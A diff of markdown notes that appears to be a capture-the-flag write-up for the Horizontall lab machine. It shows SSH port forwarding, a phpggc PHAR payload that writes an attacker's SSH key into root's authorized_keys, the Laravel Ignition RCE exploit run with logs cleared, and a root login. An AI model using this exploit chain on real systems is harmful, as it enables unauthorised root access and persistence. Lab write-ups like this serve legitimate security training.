@@ -124,15 +124,13 @@ strapi@horizontall:~/.ssh$ echo "ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQCRPJ3Jnuo
 portforwading port 8000 of host to kali
 `└─$ ssh -i id_rsa -L 8000:localhost:8000 strapi@10.129.11.224`
 http://127.0.0.1:8000/ - Laravel v8 (PHP v7.4.18)
-```
-
-
-
 https://github.com/ambionics/laravel-exploits
 
 again, try to write pub key to /root/.ssh/authorized_keys
+
+`─$ sudo php -d'phar.readonly=0' /usr/share/phpggc/phpggc --phar phar -o /tmp/exp.phar --fast-destruct monolog/rce1 system 'mkdir -p /root/.ssh/; echo "ssh-rsa`
 ```
-─$ sudo php -d'phar.readonly=0' /usr/share/phpggc/phpggc --phar phar -o /tmp/exp.phar --fast-destruct monolog/rce1 system 'mkdir -p /root/.ssh/; echo "ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQCRPJ3Jnuoi46QRyleP9e45YTjngceiew+ZxkPdz413E6xBgVeFLTZq4PUrCHpbg6O03yG7rTaTg3CG1kKhpGhuQje58F9/+BzqYO71n7lp0R5xgNI44vJfCqYUeSalDlncTr/cBWWPTHDFm+TQRg7fdNglj/1/Vz/NpewjqRse6qiOuHekKSh7WdQuojWEE8KZccYszYns7cFTE+7JBymxmSa5Zxkf9JSkHh0pRNFEELdbvGS732jZK+eJr4fSrZK02JZjKNYnGgXjGwjk83JA9+tLajxtBDAEC4Kh1ua9SUH/VJyCbJLwDQidJ2cX/kZlA2vc6QbG2xheQBtNB9bwF7qz86HD8EA4BV9XUjhC/sdeUHNEoPW275C23LsLJWlp/rSROqPNDsnjIyEIJFHk4MgpC0hs/KZgfzzBecF8VFq3TjczresRgIIBAGytWn9ldDpPYIlZNUJebBKPtFGeEen7younBheTIXZWDJbnlZ6bRXA1eG7R1FMI/X9Bc0M= ed@kali" > /root/.ssh/authorized_keys'
+AAAAB3NzaC1yc2EAAAADAQABAAABgQCRPJ3Jnuoi46QRyleP9e45YTjngceiew+ZxkPdz413E6xBgVeFLTZq4PUrCHpbg6O03yG7rTaTg3CG1kKhpGhuQje58F9/+BzqYO71n7lp0R5xgNI44vJfCqYUeSalDlncTr/cBWWPTHDFm+TQRg7fdNglj/1/Vz/NpewjqRse6qiOuHekKSh7WdQuojWEE8KZccYszYns7cFTE+7JBymxmSa5Zxkf9JSkHh0pRNFEELdbvGS732jZK+eJr4fSrZK02JZjKNYnGgXjGwjk83JA9+tLajxtBDAEC4Kh1ua9SUH/VJyCbJLwDQidJ2cX/kZlA2vc6QbG2xheQBtNB9bwF7qz86HD8EA4BV9XUjhC/sdeUHNEoPW275C23LsLJWlp/rSROqPNDsnjIyEIJFHk4MgpC0hs/KZgfzzBecF8VFq3TjczresRgIIBAGytWn9ldDpPYIlZNUJebBKPtFGeEen7younBheTIXZWDJbnlZ6bRXA1eG7R1FMI/X9Bc0M= ed@kali" > /root/.ssh/authorized_keys'
 PHP Deprecated:  Creation of dynamic property PHPGGC::$options is deprecated in /usr/share/phpggc/lib/PHPGGC.php on line 830
 PHP Deprecated:  Creation of dynamic property PHPGGC::$parameters is deprecated in /usr/share/phpggc/lib/PHPGGC.php on line 831
 PHP Deprecated:  Creation of dynamic property PHPGGC\Enhancement\Enhancements::$enhancements is deprecated in /usr/share/phpggc/lib/PHPGGC/Enhancement/Enhancements.php on line 9
@@ -140,8 +138,9 @@ PHP Deprecated:  Creation of dynamic property PHPGGC::$enhancements is deprecate
 PHP Deprecated:  Creation of dynamic property PHPGGC\Phar\Phar::$metadata is deprecated in /usr/share/phpggc/lib/PHPGGC/Phar/Format.php on line 27
 PHP Deprecated:  Creation of dynamic property PHPGGC\Phar\Phar::$dummy_metadata is deprecated in /usr/share/phpggc/lib/PHPGGC/Phar/Format.php on line 77
 ```
+
+`└─$ python3 laravel-ignition-rce.py http://127.0.0.1:8000 /tmp/exp.phar`
 ```
-└─$ python3 laravel-ignition-rce.py http://127.0.0.1:8000 /tmp/exp.phar
 ^[[+ Log file: /home/developer/myproject/storage/logs/laravel.log
 + Logs cleared
 + Successfully converted to PHAR !
@@ -149,8 +148,9 @@ PHP Deprecated:  Creation of dynamic property PHPGGC\Phar\Phar::$dummy_metadata 
 Exploit succeeded
 + Logs cleared
 ```
+
+`└─$ ssh -i id_rsa root@10.129.11.224   `            
 ```
-└─$ ssh -i id_rsa root@10.129.11.224               
 Welcome to Ubuntu 18.04.5 LTS (GNU/Linux 4.15.0-154-generic x86_64)
 
 Last login: Mon Aug 23 11:43:44 2021 from 10.10.14.6
